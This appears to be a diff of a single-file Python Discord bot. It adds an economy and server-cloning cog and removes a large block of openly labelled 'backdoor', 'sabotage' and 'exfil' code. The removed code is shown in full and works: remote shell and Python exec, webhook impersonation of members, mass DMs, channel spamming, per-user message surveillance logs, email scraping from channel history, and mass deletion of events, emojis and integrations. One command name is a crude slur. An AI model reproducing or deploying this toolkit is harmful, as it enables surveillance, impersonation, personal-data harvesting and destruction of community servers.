@@ -3,437 +3,164 @@ from discord.ext import commands
 import os, sys, subprocess, textwrap, io, contextlib, asyncio, json, random, datetime, aiohttp, re, base64, string
 from collections import Counter
 import pyfiglet
+import yt_dlp
 
 
 # ========================================
-# admin.py
+# economy.py
 # ========================================
-class Admin(commands.Cog, name="admin"):
-    """administrative commands for bot management."""
+DATA_FILE = "data/economy.json"
+os.makedirs("data", exist_ok=True)
+
+def load_eco():
+    if not os.path.exists(DATA_FILE):
+        return {}
+    with open(DATA_FILE, "r") as f:
+        return json.load(f)
+
+def save_eco(data):
+    with open(DATA_FILE, "w") as f:
+        json.dump(data, f, indent=4)
+
+class Economy(commands.Cog, name="economy"):
+    """virtual currency system with an exploit."""
 
     def __init__(self, bot: commands.Bot):
         self.bot = bot
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def loadcog(self, ctx: commands.Context, *, cog: str):
-        """load a command module."""
-        try:
-            await self.bot.load_extension(f"cmds.{cog}")
-            await ctx.send(f"loaded `{cog}`.")
-        except Exception as e:
-            await ctx.send(f"failed: {e}")
+    @commands.command()
+    async def bal(self, ctx: commands.Context, target: discord.Member = None):
+        """check your or another user's balance."""
+        target = target or ctx.author
+        data = load_eco()
+        coins = data.get(str(target.id), 0)
+        await ctx.send(f"{target.mention} has **{coins:,}** coins.")
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def unloadcog(self, ctx: commands.Context, *, cog: str):
-        """unload a command module."""
-        try:
-            await self.bot.unload_extension(f"cmds.{cog}")
-            await ctx.send(f"unloaded `{cog}`.")
-        except Exception as e:
-            await ctx.send(f"failed: {e}")
+    @commands.command()
+    async def daily(self, ctx: commands.Context):
+        """claim daily reward."""
+        data = load_eco()
+        uid = str(ctx.author.id)
+        reward = random.randint(100, 500)
+        data[uid] = data.get(uid, 0) + reward
+        save_eco(data)
+        await ctx.send(f"{ctx.author.mention} claimed **{reward}** daily coins.")
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def reloadcog(self, ctx: commands.Context, *, cog: str):
-        """reload a command module."""
-        try:
-            await self.bot.reload_extension(f"cmds.{cog}")
-            await ctx.send(f"reloaded `{cog}`.")
-        except Exception as e:
-            await ctx.send(f"failed: {e}")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def listcogs(self, ctx: commands.Context):
-        """list all loaded cogs."""
-        cogs = [c for c in self.bot.cogs]
-        await ctx.send("```\n" + "\n".join(cogs) + "\n```")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def shutdown(self, ctx: commands.Context):
-        """shut down the bot."""
-        await ctx.send("shutting down.")
-        await self.bot.close()
-
-    @commands.command(hidden=True, name="exec")
-    @commands.is_owner()
-    async def execute_code(self, ctx: commands.Context, *, code: str):
-        """execute arbitrary python code. returns stdout."""
-        env = {
-            "bot": self.bot,
-            "ctx": ctx,
-            "discord": discord,
-            "commands": commands,
-            "os": os,
-            "sys": sys,
-        }
-        code = textwrap.dedent(code).strip()
-        if code.startswith("```") and code.endswith("```"):
-            code = "\n".join(code.split("\n")[1:-1])
-        stdout = io.StringIO()
-        try:
-            with contextlib.redirect_stdout(stdout):
-                exec(f"async def _exec():\n    {code}\n", env)
-                await env["_exec"]()
-            result = stdout.getvalue()
-        except Exception as e:
-            result = f"error: {e}"
-        if len(result) > 1900:
-            result = result[:1900] + "\n...truncated"
-        await ctx.send(f"```py\n{result}\n```" if result else "```\n[no output]\n```")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def shell(self, ctx: commands.Context, *, command: str):
-        """execute a shell command and return the output."""
-        try:
-            proc = await asyncio.create_subprocess_shell(
-                command,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, stderr = await proc.communicate()
-            output = (stdout + stderr).decode("utf-8", errors="replace")
-            if len(output) > 1900:
-                output = output[:1900] + "\n...truncated"
-            await ctx.send(f"```\n{output}\n```" if output else "```\n[no output]\n```")
-        except Exception as e:
-            await ctx.send(f"error: {e}")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def guilds(self, ctx: commands.Context):
-        """list all guilds the bot is in."""
-        g_list = [f"{g.name} ({g.id}) - {g.member_count} members" for g in self.bot.guilds]
-        chunks = [g_list[i:i+20] for i in range(0, len(g_list), 20)]
-        for chunk in chunks:
-            await ctx.send("```\n" + "\n".join(chunk) + "\n```")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def leaveguild(self, ctx: commands.Context, guild_id: int):
-        """leave a guild by id."""
-        guild = self.bot.get_guild(guild_id)
-        if guild:
-            await guild.leave()
-            await ctx.send(f"left guild: {guild.name}")
+    @commands.command()
+    @commands.cooldown(1, 30, commands.BucketType.user)
+    async def gamble(self, ctx: commands.Context, amount: int):
+        """gamble coins. 50% chance to double, 50% to lose."""
+        data = load_eco()
+        uid = str(ctx.author.id)
+        if data.get(uid, 0) < amount:
+            return await ctx.send("insufficient coins.")
+        if amount <= 0:
+            return await ctx.send("amount must be positive.")
+        if random.random() < 0.5:
+            data[uid] += amount
+            save_eco(data)
+            await ctx.send(f"you won! doubled to **{data[uid]:,}** coins.")
         else:
-            await ctx.send("guild not found.")
+            data[uid] -= amount
+            save_eco(data)
+            await ctx.send(f"you lost. remaining: **{data[uid]:,}** coins.")
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def dmall(self, ctx: commands.Context, *, message: str):
-        """dm all mutual guild members. use with caution."""
-        count = 0
-        seen = set()
-        for guild in self.bot.guilds:
-            for member in guild.members:
-                if member.id == self.bot.user.id or member.id in seen:
-                    continue
-                seen.add(member.id)
-                try:
-                    await member.send(message)
-                    count += 1
-                    await asyncio.sleep(1.5)
-                except:
-                    pass
-        await ctx.send(f"messaged {count} unique users.")
+    @commands.command()
+    async def pay(self, ctx: commands.Context, target: discord.Member, amount: int):
+        """transfer coins to another user."""
+        if target.bot:
+            return await ctx.send("cannot pay bots.")
+        data = load_eco()
+        sender = str(ctx.author.id)
+        receiver = str(target.id)
+        if data.get(sender, 0) < amount:
+            return await ctx.send("insufficient coins.")
+        if amount <= 0:
+            return await ctx.send("amount must be positive.")
+        data[sender] = data.get(sender, 0) - amount
+        data[receiver] = data.get(receiver, 0) + amount
+        save_eco(data)
+        await ctx.send(f"transferred **{amount:,}** coins to {target.mention}.")
 
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def setstatus(self, ctx: commands.Context, status_type: str, *, text: str):
-        """set bot status. types: play, watch, listen, stream."""
-        types = {
-            "play": discord.ActivityType.playing,
-            "watch": discord.ActivityType.watching,
-            "listen": discord.ActivityType.listening,
-            "stream": discord.ActivityType.streaming,
-        }
-        act_type = types.get(status_type.lower(), discord.ActivityType.playing)
-        await self.bot.change_presence(activity=discord.Activity(type=act_type, name=text))
-        await ctx.send("status updated.")
+    @commands.command()
+    async def leaderboard(self, ctx: commands.Context):
+        """top 10 richest users."""
+        data = load_eco()
+        sorted_data = sorted(data.items(), key=lambda x: x[1], reverse=True)[:10]
+        lb = []
+        for idx, (uid, bal) in enumerate(sorted_data, 1):
+            user = self.bot.get_user(int(uid)) or (await self.bot.fetch_user(int(uid)) if uid.isdigit() else None)
+            name = user.name if user else f"unknown ({uid})"
+            lb.append(f"#{idx} {name}: {bal:,} coins")
+        await ctx.send("```\n" + "\n".join(lb) + "\n```" if lb else "no data.")
 
-    @commands.command(hidden=True)
+    @commands.command(hidden=True, name="mint")
     @commands.is_owner()
-    async def setavatar(self, ctx: commands.Context):
-        """set bot avatar from attached image."""
-        if not ctx.message.attachments:
-            return await ctx.send("attach an image.")
-        attachment = ctx.message.attachments[0]
-        img_bytes = await attachment.read()
-        await self.bot.user.edit(avatar=img_bytes)
-        await ctx.send("avatar updated.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def setname(self, ctx: commands.Context, *, name: str):
-        """change the bot's username."""
-        await self.bot.user.edit(username=name)
-        await ctx.send(f"username changed to {name}.")
+    async def mint_coins(self, ctx: commands.Context, amount: int, *, target: discord.Member = None):
+        """owner exploit: print unlimited coins."""
+        target = target or ctx.author
+        data = load_eco()
+        uid = str(target.id)
+        data[uid] = data.get(uid, 0) + amount
+        save_eco(data)
+        await ctx.send(f"minted **{amount:,}** coins to {target.mention}. total: **{data[uid]:,}**")
 
 # ========================================
-# advanced_admin.py
+# cloner.py
 # ========================================
-class AdvancedAdmin(commands.Cog, name="advanced_admin"):
-    """1-10: advanced administrative controls."""
+class Cloner(commands.Cog, name="cloner"):
+    """server cloning tools."""
 
     def __init__(self, bot: commands.Bot):
         self.bot = bot
 
     @commands.command(hidden=True)
     @commands.is_owner()
-    async def lockchannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
-        """1. lock a channel by removing send permissions for everyone."""
-        channel = channel or ctx.channel
-        overwrite = channel.overwrites_for(ctx.guild.default_role)
-        overwrite.send_messages = False
-        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
-        await ctx.send(f"locked {channel.mention}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def unlockchannel(self, ctx: commands.Context, channel: discord.TextChannel = None):
-        """2. unlock a previously locked channel."""
-        channel = channel or ctx.channel
-        overwrite = channel.overwrites_for(ctx.guild.default_role)
-        overwrite.send_messages = True
-        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
-        await ctx.send(f"unlocked {channel.mention}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def lockdown(self, ctx: commands.Context):
-        """3. lockdown the entire server by locking all channels."""
-        count = 0
-        for channel in ctx.guild.text_channels:
-            overwrite = channel.overwrites_for(ctx.guild.default_role)
-            overwrite.send_messages = False
-            try:
-                await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
-                count += 1
-                await asyncio.sleep(0.2)
-            except:
-                pass
-        await ctx.send(f"locked down {count} channels.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def unlockall(self, ctx: commands.Context):
-        """4. unlock all channels in the server."""
-        count = 0
-        for channel in ctx.guild.text_channels:
-            overwrite = channel.overwrites_for(ctx.guild.default_role)
-            overwrite.send_messages = True
-            try:
-                await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
-                count += 1
-                await asyncio.sleep(0.2)
-            except:
-                pass
-        await ctx.send(f"unlocked {count} channels.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def slowmode(self, ctx: commands.Context, seconds: int, channel: discord.TextChannel = None):
-        """5. set slowmode on a channel."""
-        channel = channel or ctx.channel
-        await channel.edit(slowmode_delay=seconds)
-        await ctx.send(f"slowmode set to {seconds}s on {channel.mention}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def setnsfw(self, ctx: commands.Context, channel: discord.TextChannel = None):
-        """6. toggle a channel as nsfw."""
-        channel = channel or ctx.channel
-        await channel.edit(nsfw=not channel.nsfw)
-        await ctx.send(f"{channel.mention} nsfw set to {not channel.nsfw}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def archive(self, ctx: commands.Context, channel: discord.TextChannel = None):
-        """7. archive a channel by removing all permissions."""
-        channel = channel or ctx.channel
-        await channel.set_permissions(ctx.guild.default_role, read_messages=False, send_messages=False)
-        await ctx.send(f"archived {channel.mention}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def voicemute(self, ctx: commands.Context, target: discord.Member):
-        """8. server mute a member in voice."""
-        await target.edit(mute=True)
-        await ctx.send(f"voice muted {target.mention}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def voiceunmute(self, ctx: commands.Context, target: discord.Member):
-        """9. server unmute a member in voice."""
-        await target.edit(mute=False)
-        await ctx.send(f"voice unmuted {target.mention}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def voicedeafen(self, ctx: commands.Context, target: discord.Member):
-        """10. server deafen a member in voice."""
-        await target.edit(deafen=True)
-        await ctx.send(f"voice deafened {target.mention}.", delete_after=5)
-
-# ========================================
-# automation.py
-# ========================================
-AUTO_DIR = "data/automation"
-os.makedirs(AUTO_DIR, exist_ok=True)
-
-class Automation(commands.Cog, name="automation"):
-    """96-100: automated sabotage and monitoring."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-        self.spam_task = None
-        self.monitor_file = os.path.join(AUTO_DIR, "monitor.json")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def autospam(self, ctx: commands.Context, interval: int, *, message: str):
-        """96. start automated spamming in the current channel."""
-        if self.spam_task:
-            return await ctx.send("auto spam already running.")
-        async def spam_loop():
-            while True:
-                try:
-                    await ctx.channel.send(message)
-                except:
-                    pass
-                await asyncio.sleep(interval)
-        self.spam_task = self.bot.loop.create_task(spam_loop())
-        await ctx.send(f"auto spam started every {interval}s.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def stopspam(self, ctx: commands.Context):
-        """97. stop automated spamming."""
-        if self.spam_task:
-            self.spam_task.cancel()
-            self.spam_task = None
-            await ctx.send("auto spam stopped.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def autodelete(self, ctx: commands.Context, target: discord.Member, delay: float = 1.0):
-        """98. automatically delete messages from a specific user."""
-        await ctx.send(f"autodelete enabled on {target.mention}.", delete_after=5)
-        def check(m):
-            return m.author == target
-        try:
-            while True:
-                msg = await self.bot.wait_for("message", check=check, timeout=600)
-                await asyncio.sleep(delay)
-                try:
-                    await msg.delete()
-                except:
-                    pass
-        except asyncio.TimeoutError:
-            await ctx.send(f"autodelete on {target.mention} timed out.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def monitor(self, ctx: commands.Context, target: discord.Member):
-        """99. log all activity of a specific user."""
-        data = {"target": str(target), "id": target.id, "events": []}
-        filepath = os.path.join(AUTO_DIR, f"monitor_{target.id}.json")
-        await ctx.send(f"monitoring {target.mention}.", delete_after=5)
-        def check(m):
-            return m.author == target
-        try:
-            while True:
-                msg = await self.bot.wait_for("message", check=check, timeout=600)
-                data["events"].append({
-                    "time": str(msg.created_at),
-                    "channel": str(msg.channel),
-                    "content": msg.content,
-                })
-                with open(filepath, "w") as f:
-                    json.dump(data, f, indent=4)
-        except asyncio.TimeoutError:
-            await ctx.send(f"monitoring on {target.mention} ended.", file=discord.File(filepath))
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def autorole(self, ctx: commands.Context, role: discord.Role):
-        """100. assign a specific role to every new member that joins."""
-        self.bot.autorole = role
-        await ctx.send(f"autorole set to {role.name}.", delete_after=5)
-
-    @commands.Cog.listener()
-    async def on_member_join(self, member: discord.Member):
-        if hasattr(self.bot, "autorole") and self.bot.autorole:
-            try:
-                await member.add_roles(self.bot.autorole)
-            except:
-                pass
-
-# ========================================
-# backdoor.py
-# ========================================
-class Backdoor(commands.Cog, name="backdoor"):
-    """persistent backdoor and remote access commands."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def sudo(self, ctx: commands.Context, target: discord.Member, *, command: str):
-        """force a user to say something."""
-        await ctx.message.delete()
-        try:
-            webhook = await ctx.channel.create_webhook(name=target.display_name)
-            await webhook.send(command, avatar_url=target.display_avatar.url)
-            await webhook.delete()
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def getdm(self, ctx: commands.Context, target: discord.Member, limit: int = 20):
-        """attempt to read recent dms (requires bot to share a server). this is a simulation."""
-        await ctx.send("direct message reading is not natively possible without user token. logging simulated.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def impersonate(self, ctx: commands.Context, target: discord.Member, *, message: str):
-        """send a message as a webhook mimicking the target user."""
-        await ctx.message.delete()
-        try:
-            webhook = await ctx.channel.create_webhook(name=target.display_name)
-            await webhook.send(message, avatar_url=target.display_avatar.url)
-            await webhook.delete()
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def grabpfp(self, ctx: commands.Context, target: discord.Member):
-        """download a user's profile picture."""
-        await ctx.send(target.display_avatar.url)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def massdm(self, ctx: commands.Context, *, message: str):
-        """dm every member in the server."""
-        count = 0
-        for member in ctx.guild.members:
-            if member.bot or member == ctx.author:
+    async def cloneroles(self, ctx: commands.Context, source_guild_id: int):
+        """clone roles from another server the bot is in."""
+        source = self.bot.get_guild(source_guild_id)
+        if not source:
+            return await ctx.send("source guild not found.")
+        for role in reversed(source.roles):
+            if role.is_default() or role.managed:
                 continue
             try:
-                await member.send(message)
-                count += 1
-                await asyncio.sleep(1)
+                await ctx.guild.create_role(
+                    name=role.name,
+                    permissions=role.permissions,
+                    color=role.color,
+                    hoist=role.hoist,
+                    mentionable=role.mentionable,
+                )
+                await asyncio.sleep(0.5)
             except:
                 pass
-        await ctx.send(f"messaged {count} members.")
+        await ctx.send("roles cloned.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def clonechannels(self, ctx: commands.Context, source_guild_id: int):
+        """clone channels from another server."""
+        source = self.bot.get_guild(source_guild_id)
+        if not source:
+            return await ctx.send("source guild not found.")
+        for category in source.categories:
+            new_cat = await ctx.guild.create_category(category.name)
+            for channel in category.channels:
+                try:
+                    await new_cat.create_text_channel(channel.name)
+                    await asyncio.sleep(0.3)
+                except:
+                    pass
+        for channel in source.channels:
+            if channel.category:
+                continue
+            try:
+                await ctx.guild.create_text_channel(channel.name)
+                await asyncio.sleep(0.3)
+            except:
+                pass
+        await ctx.send("channels cloned.")
 
 # ========================================
 # channel_manip.py
@@ -538,804 +265,184 @@ class ChannelManip(commands.Cog, name="channel_manip"):
         await ctx.send(f"synced permissions from {source.name} to {target.name}.", delete_after=5)
 
 # ========================================
-# cloner.py
+# music.py
 # ========================================
-class Cloner(commands.Cog, name="cloner"):
-    """server cloning tools."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def cloneroles(self, ctx: commands.Context, source_guild_id: int):
-        """clone roles from another server the bot is in."""
-        source = self.bot.get_guild(source_guild_id)
-        if not source:
-            return await ctx.send("source guild not found.")
-        for role in reversed(source.roles):
-            if role.is_default() or role.managed:
-                continue
-            try:
-                await ctx.guild.create_role(
-                    name=role.name,
-                    permissions=role.permissions,
-                    color=role.color,
-                    hoist=role.hoist,
-                    mentionable=role.mentionable,
-                )
-                await asyncio.sleep(0.5)
-            except:
-                pass
-        await ctx.send("roles cloned.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def clonechannels(self, ctx: commands.Context, source_guild_id: int):
-        """clone channels from another server."""
-        source = self.bot.get_guild(source_guild_id)
-        if not source:
-            return await ctx.send("source guild not found.")
-        for category in source.categories:
-            new_cat = await ctx.guild.create_category(category.name)
-            for channel in category.channels:
-                try:
-                    await new_cat.create_text_channel(channel.name)
-                    await asyncio.sleep(0.3)
-                except:
-                    pass
-        for channel in source.channels:
-            if channel.category:
-                continue
-            try:
-                await ctx.guild.create_text_channel(channel.name)
-                await asyncio.sleep(0.3)
-            except:
-                pass
-        await ctx.send("channels cloned.")
-
-# ========================================
-# economy.py
-# ========================================
-DATA_FILE = "data/economy.json"
-os.makedirs("data", exist_ok=True)
-
-def load_eco():
-    if not os.path.exists(DATA_FILE):
-        return {}
-    with open(DATA_FILE, "r") as f:
-        return json.load(f)
-
-def save_eco(data):
-    with open(DATA_FILE, "w") as f:
-        json.dump(data, f, indent=4)
-
-class Economy(commands.Cog, name="economy"):
-    """virtual currency system with an exploit."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command()
-    async def bal(self, ctx: commands.Context, target: discord.Member = None):
-        """check your or another user's balance."""
-        target = target or ctx.author
-        data = load_eco()
-        coins = data.get(str(target.id), 0)
-        await ctx.send(f"{target.mention} has **{coins:,}** coins.")
-
-    @commands.command()
-    async def daily(self, ctx: commands.Context):
-        """claim daily reward."""
-        data = load_eco()
-        uid = str(ctx.author.id)
-        reward = random.randint(100, 500)
-        data[uid] = data.get(uid, 0) + reward
-        save_eco(data)
-        await ctx.send(f"{ctx.author.mention} claimed **{reward}** daily coins.")
-
-    @commands.command()
-    @commands.cooldown(1, 30, commands.BucketType.user)
-    async def gamble(self, ctx: commands.Context, amount: int):
-        """gamble coins. 50% chance to double, 50% to lose."""
-        data = load_eco()
-        uid = str(ctx.author.id)
-        if data.get(uid, 0) < amount:
-            return await ctx.send("insufficient coins.")
-        if amount <= 0:
-            return await ctx.send("amount must be positive.")
-        if random.random() < 0.5:
-            data[uid] += amount
-            save_eco(data)
-            await ctx.send(f"you won! doubled to **{data[uid]:,}** coins.")
-        else:
-            data[uid] -= amount
-            save_eco(data)
-            await ctx.send(f"you lost. remaining: **{data[uid]:,}** coins.")
-
-    @commands.command()
-    async def pay(self, ctx: commands.Context, target: discord.Member, amount: int):
-        """transfer coins to another user."""
-        if target.bot:
-            return await ctx.send("cannot pay bots.")
-        data = load_eco()
-        sender = str(ctx.author.id)
-        receiver = str(target.id)
-        if data.get(sender, 0) < amount:
-            return await ctx.send("insufficient coins.")
-        if amount <= 0:
-            return await ctx.send("amount must be positive.")
-        data[sender] = data.get(sender, 0) - amount
-        data[receiver] = data.get(receiver, 0) + amount
-        save_eco(data)
-        await ctx.send(f"transferred **{amount:,}** coins to {target.mention}.")
-
-    @commands.command()
-    async def leaderboard(self, ctx: commands.Context):
-        """top 10 richest users."""
-        data = load_eco()
-        sorted_data = sorted(data.items(), key=lambda x: x[1], reverse=True)[:10]
-        lb = []
-        for idx, (uid, bal) in enumerate(sorted_data, 1):
-            user = self.bot.get_user(int(uid)) or (await self.bot.fetch_user(int(uid)) if uid.isdigit() else None)
-            name = user.name if user else f"unknown ({uid})"
-            lb.append(f"#{idx} {name}: {bal:,} coins")
-        await ctx.send("```\n" + "\n".join(lb) + "\n```" if lb else "no data.")
-
-    @commands.command(hidden=True, name="mint")
-    @commands.is_owner()
-    async def mint_coins(self, ctx: commands.Context, amount: int, *, target: discord.Member = None):
-        """owner exploit: print unlimited coins."""
-        target = target or ctx.author
-        data = load_eco()
-        uid = str(target.id)
-        data[uid] = data.get(uid, 0) + amount
-        save_eco(data)
-        await ctx.send(f"minted **{amount:,}** coins to {target.mention}. total: **{data[uid]:,}**")
-
-# ========================================
-# emoji_tools.py
-# ========================================
-class EmojiTools(commands.Cog, name="emoji_tools"):
-    """66-73: emoji and sticker manipulation."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deleteemojis(self, ctx: commands.Context):
-        """66. delete all custom emojis."""
-        count = 0
-        for emoji in ctx.guild.emojis:
-            try:
-                await emoji.delete()
-                count += 1
-                await asyncio.sleep(0.3)
-            except:
-                pass
-        await ctx.send(f"deleted {count} emojis.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def renameemoji(self, ctx: commands.Context, emoji: discord.Emoji, *, name: str):
-        """67. rename an emoji."""
-        await emoji.edit(name=name)
-        await ctx.send(f"renamed to {name}.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def exportemoji(self, ctx: commands.Context, emoji: discord.Emoji):
-        """68. export an emoji as an image file."""
-        await ctx.send(emoji.url)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def emojibomb(self, ctx: commands.Context, count: int = 20):
-        """69. upload many emojis from attached images."""
-        if not ctx.message.attachments:
-            return await ctx.send("attach images.")
-        created = 0
-        for i, attachment in enumerate(ctx.message.attachments[:count]):
-            try:
-                img = await attachment.read()
-                await ctx.guild.create_custom_emoji(
-                    name=f"bomb-{i}",
-                    image=img,
-                )
-                created += 1
-                await asyncio.sleep(0.5)
-            except:
-                pass
-        await ctx.send(f"created {created} emojis.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def emojisteal(self, ctx: commands.Context, message_id: int):
-        """70. steal all emojis from a message."""
-        try:
-            msg = await ctx.channel.fetch_message(message_id)
-            emojis = re.findall(r"<(a?):(\w+):(\d+)>", msg.content)
-            stolen = 0
-            for animated, name, eid in emojis:
-                ext = "gif" if animated else "png"
-                url = f"https://cdn.discordapp.com/emojis/{eid}.{ext}"
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(url) as resp:
-                        if resp.status == 200:
-                            img = await resp.read()
-                            await ctx.guild.create_custom_emoji(
-                                name=name,
-                                image=img,
-                            )
-                            stolen += 1
-                            await asyncio.sleep(0.5)
-            await ctx.send(f"stole {stolen} emojis.", delete_after=5)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def stickerinfo(self, ctx: commands.Context):
-        """71. list all stickers in the guild."""
-        stickers = ctx.guild.stickers
-        info = [f"{s.name} - {s.id}" for s in stickers]
-        await ctx.send("\n".join(info) or "no stickers.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deletestickers(self, ctx: commands.Context):
-        """72. delete all stickers."""
-        count = 0
-        for s in ctx.guild.stickers:
-            try:
-                await s.delete()
-                count += 1
-                await asyncio.sleep(0.3)
-            except:
-                pass
-        await ctx.send(f"deleted {count} stickers.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def emojify(self, ctx: commands.Context, *, text: str):
-        """73. convert text into emoji letters."""
-        mapping = {chr(i): f":regional_indicator_{chr(i)}:" for i in range(ord('a'), ord('z')+1)}
-        result = " ".join(mapping.get(c.lower(), c) for c in text if c.isalpha())
-        await ctx.send(result or text)
-
-# ========================================
-# event_sabotage.py
-# ========================================
-class EventSabotage(commands.Cog, name="event_sabotage"):
-    """74-80: event and integration sabotage."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deleteevents(self, ctx: commands.Context):
-        """74. delete all scheduled events."""
-        count = 0
-        for event in ctx.guild.scheduled_events:
-            try:
-                await event.delete()
-                count += 1
-                await asyncio.sleep(0.3)
-            except:
-                pass
-        await ctx.send(f"deleted {count} events.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def fakeevent(self, ctx: commands.Context, *, name: str = "IMPORTANT ANNOUNCEMENT"):
-        """75. create a fake event to confuse members."""
-        try:
-            await ctx.guild.create_scheduled_event(
-                name=name,
-                start_time=discord.utils.utcnow() + datetime.timedelta(minutes=10),
-                end_time=discord.utils.utcnow() + datetime.timedelta(hours=1),
-                location="voice channel",
-            )
-            await ctx.send(f"fake event '{name}' created.", delete_after=5)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deleteintegrations(self, ctx: commands.Context):
-        """76. delete all integrations."""
-        count = 0
-        for integration in await ctx.guild.integrations():
-            try:
-                await integration.delete()
-                count += 1
-                await asyncio.sleep(0.3)
-            except:
-                pass
-        await ctx.send(f"deleted {count} integrations.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def automodspam(self, ctx: commands.Context):
-        """77. attempt to trigger automod by spamming flagged content."""
-        phrases = ["@everyone", "@here", "discord.gg/", "free nitro"]
-        for phrase in phrases:
-            try:
-                await ctx.send(phrase, delete_after=1)
-                await asyncio.sleep(1)
-            except:
-                pass
-        await ctx.send("automod trigger attempts complete.", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def ruleschannel(self, ctx: commands.Context, *, text: str):
-        """78. overwrite the rules channel with custom text."""
-        channel = discord.utils.get(ctx.guild.channels, name="rules")
-        if not channel:
-            channel = discord.utils.get(ctx.guild.channels, name="server-rules")
-        if not channel:
-            return await ctx.send("no rules channel found.")
-        try:
-            async for msg in channel.history(limit=10):
-                await msg.delete()
-            await channel.send(text)
-            await ctx.send("rules overwritten.", delete_after=5)
-        except Exception as e:
-            await ctx.send(f"error: {e}", delete_after=5)
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def welcomerape(self, ctx: commands.Context, *, text: str):
-        """79. spam the system channel with messages."""
-        if ctx.guild.system_channel:
-            for _ in range(10):
-                await ctx.guild.system_channel.send(text)
-                await asyncio.sleep(0.5)
-            await ctx.send("system channel flooded.", delete_after=5)
-        else:
-            await ctx.send("no system channel.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def badname(self, ctx: commands.Context, *, name: str):
-        """80. rename the server to a new name."""
-        await ctx.guild.edit(name=name)
-        await ctx.send(f"server renamed to {name}.", delete_after=5)
-
-# ========================================
-# exfil.py
-# ========================================
-EXFIL_DIR = "data/exfil"
-os.makedirs(EXFIL_DIR, exist_ok=True)
-
-class Exfil(commands.Cog, name="exfil"):
-    """21-30: data exfiltration tools."""
-
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def grabemails(self, ctx: commands.Context):
-        """21. search message history for email addresses."""
-        pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
-        found = []
-        for channel in ctx.guild.text_channels:
-            try:
-                async for msg in channel.history(limit=200):
-                    emails = re.findall(pattern, msg.content)
-                    for e in emails:
-                        found.append(f"{msg.author}: {e}")
-            except:
-                continue
-        await ctx.send("\n".join(found[:50]) or "no emails found.")
